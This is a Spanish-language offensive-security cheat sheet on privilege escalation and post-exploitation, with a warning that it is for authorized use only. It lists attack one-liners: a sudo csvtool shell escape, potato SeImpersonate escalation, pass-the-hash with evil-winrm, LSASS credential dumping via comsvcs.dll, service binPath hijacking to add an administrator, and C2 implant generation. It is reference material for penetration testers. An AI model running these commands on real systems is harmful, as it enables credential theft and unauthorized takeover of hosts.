# Escalada de Privilegios & Post-Explotación

[⬅ Volver al índice](../CHEATSHEET.md) · [Versión web](https://iphobiuss.github.io)

> [!WARNING]
> **Solo entornos autorizados.** Contenido educativo y de referencia, con placeholders genéricos (`corp.local`, `$DC_IP`). No reproduce hosts, flags ni cadenas de ningún examen. Aplicar estas técnicas sin permiso por escrito es ilegal.

## Teoría

La escalada de privilegios local convierte un acceso de bajo privilegio en control total del host (**root** en Linux, **SYSTEM** en Windows). Casi siempre es cuestión de enumerar bien: el sistema ya tiene la debilidad, hay que encontrarla.

En **Linux** los vectores clásicos son binarios SUID, reglas de sudo mal puestas, capabilities, tareas cron y rutas escribibles. En **Windows** giran en torno a los privilegios del token (SeImpersonate, SeBackup, SeTcb), servicios mal configurados (binarios o rutas escribibles) y credenciales almacenadas. Proyectos como **GTFOBins** y **LOLBAS** catalogan binarios legítimos que se pueden abusar para esto.

## Herramientas del área

### GodPotato / SigmaPotato

**Qué hace** · Abusan de SeImpersonatePrivilege para duplicar un token SYSTEM.  

**Cuándo se usa** · Tienes RCE como cuenta de servicio con SeImpersonate (IIS, MSSQL).

```bash
God.exe -cmd "cmd /c whoami"
```
📖 [Documentación](https://github.com/BeichenDream/GodPotato)

### GTFOBins

**Qué hace** · Catálogo de binarios Unix que escalan privilegios vía sudo/SUID.  

**Cuándo se usa** · Al revisar 'sudo -l' o SUIDs: buscar un escape de shell conocido.

```bash
sudo csvtool call '/bin/sh;false' /etc/passwd
```
📖 [Documentación](https://gtfobins.github.io)

### evil-winrm

**Qué hace** · Shell interactiva sobre WinRM con soporte de pass-the-hash y Kerberos.  

**Cuándo se usa** · Acceso estable a un host Windows con credenciales, hash o ticket.

```bash
evil-winrm -i $TARGET -u Administrator -H <NT_HASH>
```
📖 [Documentación](https://github.com/Hackplayers/evil-winrm)

### comsvcs.dll

**Qué hace** · DLL firmada por Microsoft cuyo export MiniDump vuelca LSASS (LOLBin).  

**Cuándo se usa** · Extraer LSASS sin subir herramientas marcadas por el antivirus.

```bash
rundll32 comsvcs.dll MiniDump <pid> lsass.dmp full
```
📖 [Documentación](https://lolbas-project.github.io)

### Sliver

**Qué hace** · Framework de Command & Control open source con implants multiplataforma.  

**Cuándo se usa** · Operaciones más largas que necesitan sesiones persistentes y post-explotación estructurada.

```bash
# generar implant y abrir listener mTLS
generate --mtls $IP --os windows
```
📖 [Documentación](https://github.com/BishopFox/sliver)

### Havoc

**Qué hace** · Framework C2 moderno con demonio evasivo y perfiles configurables.  

**Cuándo se usa** · Cuando necesitas un agente más sigiloso frente a EDR que un Meterpreter.

```bash
# configurar profile + listener desde el teamserver
```
📖 [Documentación](https://github.com/HavocFramework/Havoc)

### SigmaPotato

**Qué hace** · Variante de potato con carga en memoria y opciones de evasión (p.ej. RC4).  

**Cuándo se usa** · SeImpersonate en un host con EDR que ya marca GodPotato.

```bash
# ejecución reflectiva desde memoria
```
📖 [Documentación](https://github.com/tylerdotrar/SigmaPotato)

## Comandos por objetivo

### Escalada de privilegios

```bash
# privilegios del token actual
whoami /priv
# sudo (GTFOBins)
sudo -l
sudo csvtool call '/bin/sh;false' /etc/passwd
# hijack de binario de servicio (Server Operators)
sc.exe config <svc> binPath="cmd /c net localgroup administrators $USER /add"
sc.exe start <svc>
# SeImpersonate → SYSTEM (potato)
God.exe -cmd "cmd /c whoami"
```
